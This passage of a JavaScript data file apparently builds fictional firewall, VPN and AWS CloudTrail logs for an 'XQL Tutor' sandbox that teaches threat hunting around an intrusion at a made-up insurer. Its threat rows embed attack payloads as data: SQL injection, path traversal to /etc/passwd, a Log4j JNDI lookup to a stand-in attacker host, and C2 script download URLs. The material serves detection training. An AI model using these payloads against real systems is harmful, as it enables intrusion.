// XQL Tutor - Acme Life network, cloud and identity datasets
// Models the log sources of the fictional insurer "Acme Life" with the vendor-standard dataset and field names, fictional
// identities, RFC 5737 internet addresses and the AWS documentation account ids. Nothing here describes a real organisation.
// Loaded after datasets.js: extends xdr_data and panw_ngfw_traffic_raw and adds the datasets below.
(function (root) {
  const XQL = (root.XQL = root.XQL || {});
  const { XTime } = XQL;
  const T = (s) => new XTime(XQL.parseTimeString(s));
  const D = XQL.DATASETS;

  // ---- fixed points of the fictional tenant ---------------------------------------------------------------
  const DOMAIN = 'acmelife.example';
  const OFFICE_EGRESS = ['198.51.100.146', '198.51.100.147']; // corporate office internet egress (GlobalProtect source for office staff)
  const VPN_EGRESS = '198.51.100.206'; // GlobalProtect / Prisma Access egress seen on home-worker sign-ins
  const C2 = XQL.C2_IP; // 192.0.2.45 from the endpoint storyline
  const ATK_KEYS = '192.0.2.77'; // stolen AWS access key used from Germany
  const ATK_SPRAY = '192.0.2.199'; // password spray / credential reuse source (Nigeria)
  const ATK_SCAN = '192.0.2.188'; // web scanner against the public ALB, also an IOC
  const ATK_LEGACY = '192.0.2.60'; // legacy-auth and RDP attempts (China)
  const SNOWFLAKE_APP_IP = '203.0.113.31'; // Snowflake's GitHub App egress
  const ALB = '10.240.34.41'; // public ALB private address in the core perimeter VPC
  const APP = '10.240.20.15'; // app server behind the ALB
  const AZ_VM = '10.200.1.4'; // Azure VM in the prod VNet
  const ACCT_PROD = '111122223333', ACCT_NONPROD = '444455556666';
  const ACCOUNT_NAMES = { [ACCT_PROD]: 'acme-m1-policyadmin-prod-01', [ACCT_NONPROD]: 'acme-m2-datalake-nonprod-01' };
  const FW_PROD = 'fw-syd-prod-01'; // on-prem NGFW
  const PA_GW = 'AU Southeast'; // Prisma Access mobile-user gateway

  // GeoIP for the fictional internet addresses (iploc stage and xdm.*.location.country)
  Object.assign(XQL.GEOIP, {
    [ATK_KEYS]: { country: 'DE', city: 'Frankfurt', latlon: '50.11,8.68', continent: 'Europe' },
    [ATK_SPRAY]: { country: 'NG', city: 'Lagos', latlon: '6.52,3.38', continent: 'Africa' },
    [ATK_SCAN]: { country: 'RU', city: 'Moscow', latlon: '55.76,37.62', continent: 'Europe' },
    [ATK_LEGACY]: { country: 'CN', city: 'Shanghai', latlon: '31.23,121.47', continent: 'Asia' },
    '192.0.2.9': { country: 'RU', city: 'Saint Petersburg', latlon: '59.93,30.32', continent: 'Europe' },
    [SNOWFLAKE_APP_IP]: { country: 'US', city: 'San Mateo', latlon: '37.56,-122.33', continent: 'North America' },
    '203.0.113.50': { country: 'AU', city: 'Sydney', latlon: '-33.87,151.21', continent: 'Oceania' },
    '203.0.113.88': { country: 'AU', city: 'Sydney', latlon: '-33.87,151.21', continent: 'Oceania' },
    '203.0.113.120': { country: 'AU', city: 'Melbourne', latlon: '-37.81,144.96', continent: 'Oceania' },
    '203.0.113.9': { country: 'AU', city: 'Melbourne', latlon: '-37.81,144.96', continent: 'Oceania' },
    [OFFICE_EGRESS[0]]: { country: 'AU', city: 'Melbourne', latlon: '-37.81,144.96', continent: 'Oceania' },
    [OFFICE_EGRESS[1]]: { country: 'AU', city: 'Melbourne', latlon: '-37.81,144.96', continent: 'Oceania' },
    [VPN_EGRESS]: { country: 'AU', city: 'Sydney', latlon: '-33.87,151.21', continent: 'Oceania' },
    '140.82.112.3': { country: 'US', city: 'San Francisco', latlon: '37.77,-122.42', continent: 'North America' },
  });

  // ---- xdr_data additions: agent ids and the VPC flow-log mirror rows ---------------------------------------
  const AGENT_IDS = { 'WS-FIN-042': 'a3f1c2d4e5b6a7c8d9e0f1a2b3c4d5e6', 'WS-HR-017': 'b4e2d3c5f6a7b8c9d0e1f2a3b4c5d6e7', 'WS-SALES-023': 'c5d3e4f6a7b8c9d0e1f2a3b4c5d6e7f8', 'SRV-DC-01': 'd6c4f5a7b8c9d0e1f2a3b4c5d6e7f8a9', 'SRV-WEB-02': 'e7b5a6b8c9d0e1f2a3b4c5d6e7f8a9b0', 'LAPTOP-SEC-09': 'f8a6b7c9d0e1f2a3b4c5d6e7f8a9b0c1', 'MAC-DESIGN-03': 'a9b7c8d0e1f2a3b4c5d6e7f8a9b0c1d2', 'LNX-BUILD-11': 'b0c8d9e1f2a3b4c5d6e7f8a9b0c1d2e3' };
  if (!D.xdr_data.columns.includes('agent_id')) D.xdr_data.columns.splice(2, 0, 'agent_id');
  for (const r of D.xdr_data.rows) r.agent_id = AGENT_IDS[r.agent_hostname] || null;
  D.xdr_data.fieldDocs.agent_id = 'Unique id of the agent. For flow-log stories stitched into xdr_data it holds the AWS network interface id (eni-...) and agent_hostname is null.';

  // VPC flow logs normalised as network stories (Enhanced Cloud Protection). In the product they live in xdr_data;
  // the sandbox exposes them through preset = network_story so the endpoint unit counts stay stable.
  const mirror = (time, local, lport, remote, rport, up, down) => {
    const r = {}; for (const c of D.xdr_data.columns) r[c] = null;
    Object.assign(r, { _time: T(time), agent_hostname: null, agent_os_type: null, agent_id: 'eni-0f1e2d3c4b5a6978', event_type: 2, event_sub_type: 'NETWORK_CREATE', action_local_ip: local, action_local_port: lport, action_remote_ip: remote, action_remote_port: rport, action_network_protocol: 6, action_total_upload: up, action_total_download: down, action_country: XQL.GEOIP[remote] ? XQL.GEOIP[remote].country : null, dfe_labels: 'network', _product: 'AWS VPC Flow', _vendor: 'Amazon' });
    return r;
  };
  // upload/download are from the local side's point of view: the ALB sends the reply bytes and receives the request bytes
  XQL.FLOW_MIRROR = [
    mirror('2026-10-23 10:40:02', ALB, 443, ATK_SCAN, 51514, 920, 1840),
    mirror('2026-10-23 10:40:09', ALB, 443, ATK_SCAN, 51520, 1180, 2210),
    mirror('2026-10-23 10:41:30', ALB, 443, ATK_SCAN, 51533, 970, 1960),
    mirror('2026-10-23 10:44:04', ALB, 443, ATK_SCAN, 51640, 1160, 2320),
    mirror('2026-10-23 10:45:05', ALB, 443, ATK_SCAN, 51688, 1220, 2440),
    mirror('2026-10-23 11:10:44', ALB, 443, ATK_SCAN, 51602, 3310, 2480),
    mirror('2026-10-24 09:15:12', APP, 44312, '13.224.1.7', 443, 1200, 48200),
    mirror('2026-10-26 02:00:05', ALB, 443, '198.51.100.146', 60211, 402100, 15200),
  ];
  XQL.PRESETS.network_story = { dataset: 'xdr_data', filter: (r) => r.event_type === 2, extraRows: XQL.FLOW_MIRROR };

  // ---- panw_ngfw_traffic_raw: add the columns Acme Life analysts filter on ------------------------------------------
  const TR = D.panw_ngfw_traffic_raw;
  for (const c of ['source_user', 'from_zone', 'to_zone', 'dest_location', 'log_source_name', 'is_prisma_mobile']) if (!TR.columns.includes(c)) TR.columns.splice(TR.columns.length - 2, 0, c);
  const USER_BY_IP = { '10.10.20.42': `s.hudson@${DOMAIN}`, '10.10.21.17': `p.beesly@${DOMAIN}`, '10.10.22.23': `j.halpert@${DOMAIN}`, '10.10.30.9': `d.schrute@${DOMAIN}`, '10.10.40.3': `a.martin@${DOMAIN}`, '10.10.2.8': null, '10.10.50.11': null, '10.10.1.5': null };
  const isPriv = (ip) => XQL.isPrivateIPv4(ip);
  const zone = (ip) => (!isPriv(ip) ? 'untrust' : ip.startsWith('10.10.1.') ? 'dc' : ip.startsWith('10.10.2.') ? 'dmz' : 'trust');
  for (const r of TR.rows) {
    r.source_user = USER_BY_IP[r.source_ip] === undefined ? null : USER_BY_IP[r.source_ip];
    r.from_zone = zone(r.source_ip);
    r.to_zone = zone(r.dest_ip);
    r.dest_location = XQL.GEOIP[r.dest_ip] ? XQL.GEOIP[r.dest_ip].country : (isPriv(r.dest_ip) ? '10.0.0.0-10.255.255.255' : null);
    r.log_source_name = FW_PROD; r.is_prisma_mobile = false;
  }
  Object.assign(TR.fieldDocs, { source_user: 'User-ID mapped user (UPN) for the source address, null for servers.', from_zone: 'Security zone of the source (trust, dmz, dc, untrust, vpn).', to_zone: 'Security zone of the destination.', dest_location: 'Destination country code, or the private range for internal destinations.', log_source_name: 'Firewall that logged the session (fw-syd-prod-01 is the on-prem NGFW; Prisma Access logs carry the gateway name).', is_prisma_mobile: 'true when the session came through Prisma Access mobile users (GlobalProtect), false on the on-prem firewall.' });
  const tr = (time, sip, user, dip, port, app, action, sent, recv, rule, reason, opts) => Object.assign({ _time: T(time), source_ip: sip, dest_ip: dip, dest_port: port, protocol: 'tcp', app, action, bytes_sent: sent, bytes_received: recv, rule_matched: rule, session_end_reason: reason, source_user: user, from_zone: 'vpn', to_zone: zone(dip), dest_location: XQL.GEOIP[dip] ? XQL.GEOIP[dip].country : '10.0.0.0-10.255.255.255', log_source_name: PA_GW, is_prisma_mobile: true, _product: 'NGFW', _vendor: 'PANW' }, opts || {});
  TR.rows.push(
    tr('2026-10-26 07:05:10', '10.100.5.21', `j.halpert@${DOMAIN}`, '10.10.1.5', 445, 'ms-ds-smb', 'allow', 48200, 310500, 'vpn-to-corp', 'tcp-fin'),
    tr('2026-10-26 07:06:40', '10.100.5.21', `j.halpert@${DOMAIN}`, '52.96.166.98', 443, 'outlook-web-online', 'allow', 22100, 601000, 'vpn-web-out', 'tcp-fin'),
    tr('2026-10-26 20:12:03', '10.100.5.88', `s.hudson@${DOMAIN}`, '10.10.1.5', 3389, 'ms-rdp', 'deny', 0, 0, 'deny-vpn-rdp', 'policy-deny'),
    tr('2026-10-26 20:12:40', '10.100.5.88', `s.hudson@${DOMAIN}`, '10.10.1.5', 445, 'ms-ds-smb', 'allow', 910200, 12400, 'vpn-to-corp', 'tcp-fin'),
    tr('2026-10-26 20:14:15', '10.100.5.88', `s.hudson@${DOMAIN}`, C2, 443, 'ssl', 'allow', 4210000, 8800, 'vpn-web-out', 'tcp-rst-from-client'),
  );
  TR.rows.sort((a, b) => Number(a._time) - Number(b._time));

  // ---- panw_ngfw_threat_raw ------------------------------------------------------------------------------------
  const THREAT_COLUMNS = ['_time', 'source_ip', 'dest_ip', 'source_port', 'dest_port', 'source_user', 'from_zone', 'to_zone', 'app', 'rule_matched', 'action', 'sub_type', 'threat_name', 'threat_id', 'threat_category', 'severity', 'direction', 'misc', 'file_sha256', 'log_source_name', 'is_prisma_mobile', '_product', '_vendor'];
  const th = (time, sip, sport, dip, dport, user, fz, tz, app, rule, action, sub, name, id, cat, sev, dir, misc, sha, opts) => Object.assign({ _time: T(time), source_ip: sip, source_port: sport, dest_ip: dip, dest_port: dport, source_user: user, from_zone: fz, to_zone: tz, app, rule_matched: rule, action, sub_type: sub, threat_name: name, threat_id: id, threat_category: cat, severity: sev, direction: dir, misc, file_sha256: sha, log_source_name: FW_PROD, is_prisma_mobile: false, _product: 'NGFW', _vendor: 'PANW' }, opts || {});
  const THREAT_ROWS = [
    th('2026-10-23 10:40:03', ATK_SCAN, 51514, ALB, 443, null, 'untrust', 'dmz', 'web-browsing', 'allow-inbound-web', 'alert', 'vulnerability', 'HTTP SQL Injection Attempt', 30514, 'sql-injection', 'medium', 'client-to-server', '/api/policies?id=1%27%20OR%201%3D1', null),
    th('2026-10-23 10:40:09', ATK_SCAN, 51520, ALB, 443, null, 'untrust', 'dmz', 'web-browsing', 'allow-inbound-web', 'alert', 'vulnerability', 'HTTP Directory Traversal Request Attempt', 30846, 'info-leak', 'medium', 'client-to-server', '/../../etc/passwd', null),
    th('2026-10-23 10:41:30', ATK_SCAN, 51533, ALB, 443, null, 'untrust', 'dmz', 'web-browsing', 'allow-inbound-web', 'reset-both', 'vulnerability', 'Apache Log4j Remote Code Execution Vulnerability', 91991, 'code-execution', 'critical', 'client-to-server', '${jndi:ldap://192.0.2.188/a}', null),
    th('2026-10-23 11:10:44', ATK_SCAN, 51602, ALB, 443, null, 'untrust', 'dmz', 'web-browsing', 'allow-inbound-web', 'alert', 'vulnerability', 'HTTP Unauthorized Error Brute Force Attempt', 40031, 'brute-force', 'high', 'client-to-server', '/api/login', null),
    th('2026-10-23 11:13:43', '10.10.2.8', 49912, C2, 80, null, 'dmz', 'untrust', 'web-browsing', 'allow-web-out', 'alert', 'spyware', 'Suspicious PowerShell Script Download', 86002, 'command-and-control', 'high', 'server-to-client', 'http://192.0.2.45/sh.ps1', null),
    th('2026-10-26 09:12:31', '10.10.20.42', 49123, C2, 443, `s.hudson@${DOMAIN}`, 'trust', 'untrust', 'ssl', 'allow-web-out', 'alert', 'spyware', 'Cobalt Strike Beacon Command and Control Traffic Detection', 86419, 'command-and-control', 'critical', 'client-to-server', '192.0.2.45:443', null),
    th('2026-10-26 09:14:32', '10.10.20.42', 49130, C2, 80, `s.hudson@${DOMAIN}`, 'trust', 'untrust', 'web-browsing', 'allow-web-out', 'alert', 'wildfire', 'Windows Executable (EXE)', 52033, 'wildfire-verdict', 'high', 'server-to-client', 'update.exe', XQL.IOC_SHA),
    th('2026-10-26 09:15:07', '10.10.20.42', 49140, C2, 4444, `s.hudson@${DOMAIN}`, 'trust', 'untrust', 'unknown-tcp', 'allow-any-out', 'alert', 'spyware', 'Cobalt Strike Beacon Command and Control Traffic Detection', 86419, 'command-and-control', 'critical', 'client-to-server', '192.0.2.45:4444', null),
    th('2026-10-26 11:06:02', '10.10.21.17', 50231, '104.20.67.143', 443, `p.beesly@${DOMAIN}`, 'trust', 'untrust', 'ssl', 'allow-web-out', 'alert', 'url', 'pastebin.com', 0, 'online-storage-and-backup', 'informational', 'client-to-server', 'pastebin.com/raw/x8Kq2Lp', null),
    th('2026-10-26 15:31:02', '10.10.40.3', 52001, C2, 443, `a.martin@${DOMAIN}`, 'trust', 'untrust', 'ssl', 'allow-web-out', 'alert', 'spyware', 'Cobalt Strike Beacon Command and Control Traffic Detection', 86419, 'command-and-control', 'critical', 'client-to-server', '192.0.2.45:443', null),
    th('2026-10-26 16:00:03', '10.10.22.23', 50870, C2, 80, `j.halpert@${DOMAIN}`, 'trust', 'untrust', 'web-browsing', 'allow-web-out', 'block-url', 'url', 'malware', 0, 'malware', 'high', 'client-to-server', 'http://192.0.2.45/a.hta', null),
    th('2026-10-26 20:14:16', '10.100.5.88', 50113, C2, 443, `s.hudson@${DOMAIN}`, 'vpn', 'untrust', 'ssl', 'vpn-web-out', 'alert', 'spyware', 'Cobalt Strike Beacon Command and Control Traffic Detection', 86419, 'command-and-control', 'critical', 'client-to-server', '192.0.2.45:443', null, { log_source_name: PA_GW, is_prisma_mobile: true }),
    th('2026-10-24 21:57:59', ATK_SCAN, 44002, '203.0.113.10', 3389, null, 'untrust', 'dmz', 'ms-rdp', 'deny-inbound-rdp', 'drop', 'vulnerability', 'Microsoft Windows RDP Brute Force Attempt', 40016, 'brute-force', 'high', 'client-to-server', 'rdp', null),
    th('2026-10-21 03:12:40', '192.0.2.9', 60001, '203.0.113.10', 443, null, 'untrust', 'dmz', 'web-browsing', 'allow-inbound-web', 'alert', 'vulnerability', 'HTTP Directory Traversal Request Attempt', 30846, 'info-leak', 'medium', 'client-to-server', '/.git/config', null),
  ].sort((a, b) => Number(a._time) - Number(b._time));

  // ---- panw_ngfw_url_raw ---------------------------------------------------------------------------------------
  const URL_COLUMNS = ['_time', 'source_ip', 'dest_ip', 'source_user', 'url_domain', 'uri', 'url_category_list', 'action', 'app', 'rule_matched', 'http_method', 'user_agent', 'log_source_name', 'is_prisma_mobile', '_product', '_vendor'];
  const ur = (time, sip, user, dip, domain, uri, cats, action, app, rule, method, ua, opts) => Object.assign({ _time: T(time), source_ip: sip, dest_ip: dip, source_user: user, url_domain: domain, uri, url_category_list: cats, action, app, rule_matched: rule, http_method: method, user_agent: ua, log_source_name: FW_PROD, is_prisma_mobile: false, _product: 'NGFW', _vendor: 'PANW' }, opts || {});
  const CHROME = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36';
  const URL_ROWS = [
    ur('2026-10-26 09:00:02', '10.10.20.42', `s.hudson@${DOMAIN}`, '52.96.166.98', 'outlook.office365.com', 'outlook.office365.com/', 'business-and-economy,low-risk', 'alert', 'ssl', 'allow-web-out', null, null),
    ur('2026-10-26 09:12:31', '10.10.20.42', `s.hudson@${DOMAIN}`, C2, '192.0.2.45', '192.0.2.45/', 'command-and-control,high-risk', 'alert', 'ssl', 'allow-web-out', null, null),
    ur('2026-10-26 09:14:32', '10.10.20.42', `s.hudson@${DOMAIN}`, C2, '192.0.2.45', '192.0.2.45/update.exe', 'malware,high-risk', 'alert', 'web-browsing', 'allow-web-out', 'GET', 'Microsoft-CryptoAPI/10.0'),
    ur('2026-10-26 10:03:01', '10.10.21.17', `p.beesly@${DOMAIN}`, '142.250.187.206', 'www.google.com', 'www.google.com/', 'search-engines,low-risk', 'alert', 'ssl', 'allow-web-out', null, null),
    ur('2026-10-26 11:06:01', '10.10.21.17', `p.beesly@${DOMAIN}`, '104.20.67.143', 'pastebin.com', 'pastebin.com/', 'online-storage-and-backup,medium-risk', 'alert', 'ssl', 'allow-web-out', null, null),
    ur('2026-10-26 11:06:03', '10.10.21.17', `p.beesly@${DOMAIN}`, '104.20.67.143', 'pastebin.com', 'pastebin.com/raw/x8Kq2Lp', 'online-storage-and-backup,medium-risk', 'alert', 'web-browsing', 'allow-web-out', 'GET', 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-AU) WindowsPowerShell/5.1.19041.4894'),
    ur('2026-10-25 16:41:02', '10.10.22.23', `j.halpert@${DOMAIN}`, '185.33.12.5', 'relay-1.anydesk.com', 'relay-1.anydesk.com/', 'remote-access,medium-risk', 'alert', 'ssl', 'allow-any-out', null, null),
    ur('2026-10-26 16:00:03', '10.10.22.23', `j.halpert@${DOMAIN}`, C2, '192.0.2.45', '192.0.2.45/a.hta', 'malware,high-risk', 'block-url', 'web-browsing', 'allow-web-out', 'GET', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0)'),
    ur('2026-10-26 13:40:10', '10.10.30.9', `d.schrute@${DOMAIN}`, '203.0.113.50', 'app.acme-atlas.privatelink.snowflakecomputing.com', 'app.acme-atlas.privatelink.snowflakecomputing.com/', 'business-and-economy,low-risk', 'alert', 'ssl', 'allow-web-out', null, null),
    ur('2026-10-26 13:41:00', '10.10.30.9', `d.schrute@${DOMAIN}`, '203.0.113.50', 'app.australia-east.privatelink.snowflakecomputing.com', 'app.australia-east.privatelink.snowflakecomputing.com/', 'business-and-economy,low-risk', 'alert', 'ssl', 'allow-web-out', null, null),
    ur('2026-10-26 14:02:11', '10.10.30.9', `d.schrute@${DOMAIN}`, '140.82.112.3', 'github.com', 'github.com/', 'computer-and-internet-info,low-risk', 'alert', 'ssl', 'allow-web-out', null, null),
    ur('2026-10-26 20:14:16', '10.100.5.88', `s.hudson@${DOMAIN}`, C2, '192.0.2.45', '192.0.2.45/', 'command-and-control,high-risk', 'alert', 'ssl', 'vpn-web-out', null, null, { log_source_name: PA_GW, is_prisma_mobile: true }),
    ur('2026-10-26 07:06:41', '10.100.5.21', `j.halpert@${DOMAIN}`, '52.96.166.98', 'outlook.office365.com', 'outlook.office365.com/', 'business-and-economy,low-risk', 'alert', 'ssl', 'vpn-web-out', null, null, { log_source_name: PA_GW, is_prisma_mobile: true }),
    ur('2026-10-22 08:20:01', '10.10.20.42', `s.hudson@${DOMAIN}`, '198.51.100.24', 'www.acme-payroll.com', 'www.acme-payroll.com/', 'business-and-economy,low-risk', 'alert', 'ssl', 'allow-web-out', null, null),
  ];

  // ---- panw_ngfw_globalprotect_raw -----------------------------------------------------------------------------
  const GP_COLUMNS = ['_time', 'event_id', 'status', 'source_user', 'public_ip', 'private_ip', 'source_region', 'endpoint_device_name', 'endpoint_os_type', 'client_ver', 'auth_method', 'portal', 'gateway', 'error', 'login_duration', 'log_source_name', 'is_prisma_mobile', '_product', '_vendor'];
  const gp = (time, ev, status, user, pub, priv, region, device, os, auth, err, dur) => ({ _time: T(time), event_id: ev, status, source_user: user, public_ip: pub, private_ip: priv, source_region: region, endpoint_device_name: device, endpoint_os_type: os, client_ver: '6.2.5', auth_method: auth, portal: 'vpn.acmelife.example', gateway: PA_GW, error: err, login_duration: dur, log_source_name: PA_GW, is_prisma_mobile: true, _product: 'NGFW', _vendor: 'PANW' });
  const GP_ROWS = [
    gp('2026-10-26 07:04:30', 'portal-auth', 'success', `j.halpert@${DOMAIN}`, '203.0.113.88', null, 'AU', 'WS-SALES-023', 'Windows', 'SAML', null, null),
    gp('2026-10-26 07:04:41', 'gateway-auth', 'success', `j.halpert@${DOMAIN}`, '203.0.113.88', null, 'AU', 'WS-SALES-023', 'Windows', 'SAML', null, null),
    gp('2026-10-26 07:04:42', 'gateway-connected', 'success', `j.halpert@${DOMAIN}`, '203.0.113.88', '10.100.5.21', 'AU', 'WS-SALES-023', 'Windows', 'SAML', null, null),
    gp('2026-10-26 17:30:10', 'gateway-logout', 'success', `j.halpert@${DOMAIN}`, '203.0.113.88', '10.100.5.21', 'AU', 'WS-SALES-023', 'Windows', 'SAML', 'client logout', 37528),
    gp('2026-10-26 19:58:02', 'portal-auth', 'failure', `s.hudson@${DOMAIN}`, ATK_SPRAY, null, 'NG', 'DESKTOP-K1Q7', 'Windows', 'SAML', 'Authentication failed: MFA denied', null),
    gp('2026-10-26 20:03:15', 'portal-auth', 'failure', `s.hudson@${DOMAIN}`, ATK_SPRAY, null, 'NG', 'DESKTOP-K1Q7', 'Windows', 'SAML', 'Authentication failed: MFA denied', null),
    gp('2026-10-26 20:11:40', 'portal-auth', 'success', `s.hudson@${DOMAIN}`, ATK_SPRAY, null, 'NG', 'DESKTOP-K1Q7', 'Windows', 'SAML', null, null),
    gp('2026-10-26 20:11:52', 'gateway-auth', 'success', `s.hudson@${DOMAIN}`, ATK_SPRAY, null, 'NG', 'DESKTOP-K1Q7', 'Windows', 'SAML', null, null),
    gp('2026-10-26 20:11:53', 'gateway-connected', 'success', `s.hudson@${DOMAIN}`, ATK_SPRAY, '10.100.5.88', 'NG', 'DESKTOP-K1Q7', 'Windows', 'SAML', null, null),
    gp('2026-10-26 20:31:08', 'gateway-logout', 'success', `s.hudson@${DOMAIN}`, ATK_SPRAY, '10.100.5.88', 'NG', 'DESKTOP-K1Q7', 'Windows', 'SAML', 'admin logout', 1155),
    gp('2026-10-25 08:10:05', 'portal-auth', 'success', `p.beesly@${DOMAIN}`, '203.0.113.120', null, 'AU', 'WS-HR-017', 'Windows', 'SAML', null, null),
    gp('2026-10-25 08:10:17', 'gateway-connected', 'success', `p.beesly@${DOMAIN}`, '203.0.113.120', '10.100.5.40', 'AU', 'WS-HR-017', 'Windows', 'SAML', null, null),
    gp('2026-10-25 16:02:30', 'gateway-logout', 'success', `p.beesly@${DOMAIN}`, '203.0.113.120', '10.100.5.40', 'AU', 'WS-HR-017', 'Windows', 'SAML', 'client logout', 28333),
    gp('2026-10-27 06:45:11', 'portal-auth', 'success', `d.schrute@${DOMAIN}`, '203.0.113.9', null, 'AU', 'LAPTOP-SEC-09', 'Windows', 'SAML', null, null),
    gp('2026-10-27 06:45:22', 'gateway-connected', 'success', `d.schrute@${DOMAIN}`, '203.0.113.9', '10.100.5.12', 'AU', 'LAPTOP-SEC-09', 'Windows', 'SAML', null, null),
    gp('2026-10-24 22:40:00', 'portal-auth', 'failure', `administrator@${DOMAIN}`, ATK_LEGACY, null, 'CN', 'unknown', 'Linux', 'LDAP', 'Authentication failed: invalid username or password', null),
    gp('2026-10-24 22:40:06', 'portal-auth', 'failure', `administrator@${DOMAIN}`, ATK_LEGACY, null, 'CN', 'unknown', 'Linux', 'LDAP', 'Authentication failed: invalid username or password', null),
    gp('2026-10-24 22:40:13', 'portal-auth', 'failure', `svc_backup@${DOMAIN}`, ATK_LEGACY, null, 'CN', 'unknown', 'Linux', 'LDAP', 'Authentication failed: invalid username or password', null),
  ];

  // ---- amazon_aws_raw: CloudTrail (_log_type = "cloudtrail") and VPC flow logs (_log_type = "flowlogs") -----------
  const AWS_COLUMNS = ['_time', '_log_type', 'eventTime', 'eventSource', 'eventName', 'eventType', 'eventCategory', 'awsRegion', 'sourceIPAddress', 'userAgent', 'userIdentity', 'requestParameters', 'responseElements', 'additionalEventData', 'errorCode', 'errorMessage', 'readOnly', 'managementEvent', 'recipientAccountId',
    'account_id', 'interface_id', 'srcaddr', 'dstaddr', 'srcport', 'dstport', 'protocol', 'packets', 'bytes', 'start', 'end', 'action', 'log_status', 'flow_direction', 'pkt_srcaddr', 'pkt_dstaddr', 'vpc_id', '_product', '_vendor'];
  const blank = (cols) => { const o = {}; for (const c of cols) o[c] = null; return o; };
  const SYD = 'ap-southeast-2';
  const ident = {
    svcDeploy: (ip) => ({ type: 'IAMUser', principalId: 'AIDAEXAMPLE7XQ2KZ5M', arn: `arn:aws:iam::${ACCT_PROD}:user/svc-deploy`, accountId: ACCT_PROD, accessKeyId: 'AKIAEXAMPLE5TJ3Q9LD', userName: 'svc-deploy' }),
    root: () => ({ type: 'Root', principalId: ACCT_PROD, arn: `arn:aws:iam::${ACCT_PROD}:root`, accountId: ACCT_PROD, accessKeyId: 'ASIAEXAMPLEROOT' }),
    sso: (user, acct, role) => ({ type: 'AssumedRole', principalId: `AROAEXAMPLE${role.slice(0, 6).toUpperCase()}:${user}`, arn: `arn:aws:sts::${acct}:assumed-role/AWSReservedSSO_${role}_a1b2c3d4e5f6a7b8/${user}`, accountId: acct, sessionContext: { sessionIssuer: { type: 'Role', userName: `AWSReservedSSO_${role}_a1b2c3d4e5f6a7b8` }, attributes: { mfaAuthenticated: 'true' } } }),
    aft: () => ({ type: 'AssumedRole', principalId: 'AROAEXAMPLEAFT:aft-pipeline', arn: `arn:aws:sts::${ACCT_PROD}:assumed-role/AWSAFTExecution/aft-pipeline`, accountId: ACCT_PROD, sessionContext: { sessionIssuer: { type: 'Role', userName: 'AWSAFTExecution' } } }),
    lambda: () => ({ type: 'AssumedRole', principalId: 'AROAEXAMPLELAMBDA:policy-export', arn: `arn:aws:sts::${ACCT_NONPROD}:assumed-role/lambda-policy-export-role/policy-export`, accountId: ACCT_NONPROD, sessionContext: { sessionIssuer: { type: 'Role', userName: 'lambda-policy-export-role' } } }),
  };
  const ct = (time, source, name, acct, region, ip, ua, identity, req, resp, extra) => Object.assign(blank(AWS_COLUMNS), {
    _time: T(time), _log_type: 'cloudtrail', eventTime: time.replace(' ', 'T') + 'Z', eventSource: source, eventName: name, eventType: name === 'ConsoleLogin' ? 'AwsConsoleSignIn' : 'AwsApiCall', eventCategory: 'Management', awsRegion: region, sourceIPAddress: ip, userAgent: ua,
    userIdentity: JSON.stringify(identity), requestParameters: req == null ? null : JSON.stringify(req), responseElements: resp == null ? null : JSON.stringify(resp), additionalEventData: null, errorCode: null, errorMessage: null,
    readOnly: /^(Describe|List|Get|Lookup)/.test(name), managementEvent: true, recipientAccountId: acct, _product: 'AWS', _vendor: 'Amazon',
  }, extra || {});
  const AWSCLI = 'aws-cli/2.17.12 Python/3.11.9 Linux/6.1.0 exe/x86_64.ubuntu.22', CONSOLE = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36', TF = 'APN/1.0 HashiCorp/1.0 Terraform/1.9.5', BOTO = 'Boto3/1.34.120 md/Botocore#1.34.120 ua/2.0 os/linux#6.1 md/arch#x86_64 lang/python#3.12.4 exec-env/AWS_Lambda_python3.12';
  const CT_ROWS = [
    // normal SSO work from the office
    ct('2026-10-26 01:02:11', 'sts.amazonaws.com', 'AssumeRoleWithSAML', ACCT_PROD, SYD, OFFICE_EGRESS[0], CONSOLE, { type: 'SAMLUser', principalId: `d.schrute@${DOMAIN}`, userName: `d.schrute@${DOMAIN}` }, { roleArn: `arn:aws:iam::${ACCT_PROD}:role/AWSReservedSSO_CyberOps_a1b2c3d4e5f6a7b8` }, null),
    ct('2026-10-26 01:03:40', 'ec2.amazonaws.com', 'DescribeInstances', ACCT_PROD, SYD, OFFICE_EGRESS[0], CONSOLE, ident.sso(`d.schrute@${DOMAIN}`, ACCT_PROD, 'CyberOps'), null, null),
    ct('2026-10-26 01:04:02', 'ec2.amazonaws.com', 'DescribeFlowLogs', ACCT_PROD, SYD, OFFICE_EGRESS[0], CONSOLE, ident.sso(`d.schrute@${DOMAIN}`, ACCT_PROD, 'CyberOps'), null, null),
    ct('2026-10-26 01:05:30', 'cloudtrail.amazonaws.com', 'LookupEvents', ACCT_PROD, SYD, OFFICE_EGRESS[0], CONSOLE, ident.sso(`d.schrute@${DOMAIN}`, ACCT_PROD, 'CyberOps'), null, null),
    ct('2026-10-22 23:30:00', 'cloudformation.amazonaws.com', 'UpdateStack', ACCT_PROD, SYD, '10.240.60.8', TF, ident.aft(), { stackName: 'aft-policyadmin-baseline' }, { stackId: `arn:aws:cloudformation:${SYD}:${ACCT_PROD}:stack/aft-policyadmin-baseline/9f1e` }),
    ct('2026-10-22 23:31:12', 'iam.amazonaws.com', 'CreateRole', ACCT_PROD, SYD, '10.240.60.8', TF, ident.aft(), { roleName: 'policyadmin-app-task-role' }, null),
    ct('2026-10-24 03:00:04', 's3.amazonaws.com', 'GetObject', ACCT_NONPROD, SYD, '10.241.8.3', BOTO, ident.lambda(), { bucketName: 'acme-datalake-nonprod-exports', key: 'policies/2026-10-24.parquet' }, null, { eventCategory: 'Data', managementEvent: false }),
    ct('2026-10-25 03:00:05', 's3.amazonaws.com', 'GetObject', ACCT_NONPROD, SYD, '10.241.8.3', BOTO, ident.lambda(), { bucketName: 'acme-datalake-nonprod-exports', key: 'policies/2026-10-25.parquet' }, null, { eventCategory: 'Data', managementEvent: false }),
    ct('2026-10-26 03:00:05', 's3.amazonaws.com', 'GetObject', ACCT_NONPROD, SYD, '10.241.8.3', BOTO, ident.lambda(), { bucketName: 'acme-datalake-nonprod-exports', key: 'policies/2026-10-26.parquet' }, null, { eventCategory: 'Data', managementEvent: false }),
